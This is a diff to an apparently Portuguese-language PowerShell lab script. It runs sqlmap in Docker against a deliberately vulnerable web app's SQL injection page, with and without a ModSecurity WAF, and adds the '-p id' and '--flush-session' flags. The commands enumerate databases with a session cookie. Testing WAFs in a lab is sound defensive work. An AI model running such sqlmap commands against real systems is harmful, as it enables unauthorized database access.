@@ -77,12 +77,12 @@ if ($RunSqlmap) {
     Write-Host "[*] sqlmap (In-Band) SEM WAF (Baseline)..."
     docker run --rm --network srsi_net -v "${SrcDir}/results/sqlmap_base:/root/.local/share/sqlmap" parrotsec/sqlmap `
         -u "http://proxy-base:80/vulnerabilities/sqli/?id=1&Submit=Submit" `
-        --cookie="$baseCookie" --batch --dbs --level=2 --risk=1
+        --cookie="$baseCookie" -p id --batch --dbs --flush-session --level=2 --risk=1
 
     Write-Host "[*] sqlmap (In-Band) COM WAF (ModSecurity + CRS)..."
     docker run --rm --network srsi_net -v "${SrcDir}/results/sqlmap_waf:/root/.local/share/sqlmap" parrotsec/sqlmap `
         -u "http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit" `
-        --cookie="$wafCookie" --batch --dbs --level=2 --risk=1
+        --cookie="$wafCookie" -p id --batch --dbs --flush-session --level=2 --risk=1
 }
 
 Write-Host "`n[+] Concluido! Verifica a pasta SRC/results e SRC/logs/audit.log." -ForegroundColor Green
